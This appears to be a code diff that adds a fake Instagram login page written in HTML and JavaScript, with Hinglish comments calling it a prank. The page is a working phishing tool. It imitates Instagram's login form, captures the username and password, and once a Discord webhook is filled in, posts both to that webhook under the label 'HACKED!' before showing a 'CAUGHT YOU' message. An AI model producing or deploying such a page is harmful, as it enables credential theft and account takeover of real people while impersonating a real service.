@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Instagram</title>
+  <meta name="viewport" content="width=device-width">
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif;}
+    body{background:linear-gradient(45deg,#f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%);height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
+    .box{background:#fff;border-radius:8px;padding:30px 25px;max-width:350px;width:100%;box-shadow:0 10px 30px rgba(0,0,0,0.3);}
+    .logo{text-align:center;margin-bottom:25px;}
+    .logo h1{font-size:32px;color:#262626;font-weight:bold;letter-spacing:-1px;}
+    .input-group{margin-bottom:15px;}
+    label{display:block;font-size:13px;color:#666;margin-bottom:5px;}
+    input{width:100%;padding:12px;border:1px solid #ddd;border-radius:5px;font-size:14px;background:#fafafa;}
+    input:focus{outline:none;border-color:#0095f6;background:#fff;box-shadow:0 0 0 2px rgba(0,149,246,0.2);}
+    .btn{width:100%;padding:12px;background:#0095f6;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer;margin:10px 0;}
+    .btn:hover{background:#007bb5;}
+    .btn:disabled{background:#ccc;cursor:not-allowed;}
+    .loading{display:none;text-align:center;padding:20px;color:#666;}
+    .spin{width:24px;height:24px;border:3px solid #eee;border-top:3px solid #0095f6;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 10px;}
+    @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+    .hidden{display:none;}
+    .troll{display:none;background:linear-gradient(45deg,#ff4757,#ff7831);color:#fff;padding:25px;border-radius:10px;text-align:center;margin-top:20px;animation:shake 0.5s;}
+    @keyframes shake{0%,100%{transform:translateX(0);}25%{transform:translateX(-8px);}75%{transform:translateX(8px);}}
+    .divider{position:relative;margin:20px 0;text-align:center;color:#999;font-size:12px;}
+    .divider:before{content:'';position:absolute;top:50%;left:0;right:0;height:1px;background:#eee;}
+    .divider span{background:#fff;padding:0 15px;}
+    a{color:#0095f6;text-decoration:none;font-size:13px;}
+    @media(max-width:500px){.box{padding:20px 20px 15px;}}
+  </style>
+</head>
+<body>
+  <div class="box">
+    <!-- Instagram Logo -->
+    <div class="logo">
+      <h1>📱 Instagram</h1>
+    </div>
+
+    <!-- Login Form -->
+    <div id="login">
+      <div class="input-group">
+        <label>Username or Email</label>
+        <input id="user" placeholder="Enter username" required>
+      </div>
+      
+      <div class="input-group">
+        <label>Password</label>
+        <input id="pass" type="password" placeholder="Enter password" required>
+      </div>
+      
+      <button class="btn" onclick="hackLogin()">Log in</button>
+      
+      <div class="loading" id="load">
+        <div class="spin"></div>
+        <div>Logging in...</div>
+      </div>
+    </div>
+
+    <div class="divider">
+      <span>OR</span>
+    </div>
+
+    <a href="#">Log in with Facebook</a>
+    <a href="#" style="color:#00376b;">Forgot password?</a>
+
+    <!-- TROLL -->
+    <div id="gotcha" class="troll">
+      <h2 style="font-size:22px;margin-bottom:10px;">😂😂 **CAUGHT YOU!** 😂😂</h2>
+      <div style="font-size:18px;margin-bottom:8px;">
+        ID: <strong style="font-size:20px;" id="hackedID"></strong>
+      </div>
+      <div style="font-size:14px;">Ye prank tha bhai! 😎🔥</div>
+    </div>
+  </div>
+
+  <script>
+    // 🔥 DISCORD WEBHOOK YAHAN DALO (optional)
+    const WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE";
+
+    function hackLogin(){
+      var username = document.getElementById("user").value;
+      var password = document.getElementById("pass").value;
+      
+      if(!username || !password){
+        alert("Username password dal!");
+        return;
+      }
+      
+      // SEND TO DISCORD (agar webhook hai to)
+      if(WEBHOOK != "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"){
+        fetch(WEBHOOK,{
+          method:"POST",
+          headers:{"Content-Type":"application/json"},
+          body:JSON.stringify({
+            content:`🎣 **HACKED!**\n👤 ${username}\n🔑 ${password}\n🕐 ${new Date().toLocaleTimeString()}`
+          })
+        });
+      }
+      
+      // Hide button, show loading
+      document.querySelector(".btn").style.display="none";
+      document.getElementById("load").style.display="block";
+      
+      // 2 sec wait then TROLL
+      setTimeout(function(){
+        document.getElementById("load").style.display="none";
+        document.getElementById("hackedID").innerText = username;
+        document.getElementById("gotcha").style.display="block";
+        document.getElementById("gotcha").scrollIntoView();
+      }, 2000);
+    }
+  </script>
+</body>
+</html>
